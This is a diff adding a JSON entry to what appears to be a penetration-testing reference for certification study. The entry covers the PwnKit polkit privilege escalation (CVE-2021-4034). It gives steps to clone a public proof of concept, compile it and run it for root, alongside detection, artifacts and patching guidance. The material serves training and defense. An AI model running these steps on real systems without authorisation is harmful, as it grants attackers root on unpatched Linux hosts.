@@ -1,0 +1,98 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "gcc",
+    "git",
+    "pkexec"
+  ],
+  "tags": [
+    "polkit",
+    "cve-2021-4034",
+    "pwnkit"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Polkit",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Sanity-check pkexec works before the exploit",
+      "command": "pkexec -u root id"
+    }
+  ],
+  "notes": "Polkit file locations: actions /usr/share/polkit-1/actions, rules /usr/share/polkit-1/rules.d, local authority /etc/polkit-1/localauthority/50-local.d.",
+  "references": [
+    {
+      "title": "Qualys PwnKit advisory",
+      "url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034"
+    },
+    {
+      "title": "CVE-2021-4034 PoC (arthepsy)",
+      "url": "https://github.com/arthepsy/CVE-2021-4034"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-linux-lpe-cves",
+      "note": "PwnKit hits nearly every distro - confirm pkexec exists.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "polkit-pwnkit",
+  "name": "Polkit - PwnKit (CVE-2021-4034)",
+  "command": "./poc",
+  "description": "PwnKit is a memory-corruption bug in polkit's pkexec (SUID root) present for 12+ years, giving any local user instant root. Compile the tiny PoC and run it.",
+  "steps": [
+    {
+      "label": "1. Confirm pkexec exists",
+      "command": "which pkexec\nls -l /usr/bin/pkexec\nuname -a; cat /etc/lsb-release"
+    },
+    {
+      "label": "2. Clone + compile",
+      "command": "git clone https://github.com/arthepsy/CVE-2021-4034.git && cd CVE-2021-4034\ngcc cve-2021-4034-poc.c -o poc"
+    },
+    {
+      "label": "3. Run and verify",
+      "command": "./poc\nid"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1068",
+    "T1548"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "PwnKit (CVE-2021-4034) exploits a memory corruption vulnerability in pkexec, the setuid binary of the polkit privilege manager. An out-of-bounds write in argument processing allows an attacker to manipulate environment variables in a way that causes pkexec to execute attacker-controlled code with root privileges, even without sudo access.",
+    "prerequisites": "Local user account. pkexec binary present with setuid bit (default installation). Vulnerable polkit version (< 0.120 with patch, specific to all major distros through early 2022).",
+    "impact": "Instant local root access. No sudo privileges required. Works even when sudoers restricts the user to nothing. Affects virtually all major Linux distributions.",
+    "detection": "Execution of pkexec exploit binary (unusual pkexec usage with specific argument patterns). EDR: uid escalation 1000->0 via pkexec process. Kernel/auditd: SEGFAULT or unusual memory mapping from pkexec.",
+    "artifacts": "Process audit: pkexec with exploit args executed by non-root | EDR: uid change via pkexec | Application log: polkit error messages",
+    "prevention": "Update polkit immediately (package: policykit-1 on Debian/Ubuntu). Patch was released January 2022. As a temporary mitigation, remove SUID from pkexec: chmod 0755 /usr/bin/pkexec (breaks PolicyKit functionality). Monitor for CVE-2021-4034 exploit signatures.",
+    "misconfiguration": "Vulnerable polkit version installed (< 0.120 with January 2022 patch). pkexec has setuid bit (default). System not patched since early 2022.",
+    "vulnerable_config": "# Vulnerable pkexec\nls -la /usr/bin/pkexec\n# -rwsr-xr-x 1 root root ... /usr/bin/pkexec\n\npkexec --version\n# pkexec version 0.105  <- vulnerable",
+    "secure_config": "# Update polkit\napt update && apt install --only-upgrade policykit-1\n\n# Verify patch\npkexec --version  # should be 0.120+\n\n# Temporary mitigation (breaks PolicyKit)\nchmod 0755 /usr/bin/pkexec",
+    "sources": [
+      "HTB M25",
+      "MITRE T1068",
+      "OWASP A06:2021"
+    ]
+  }
+}
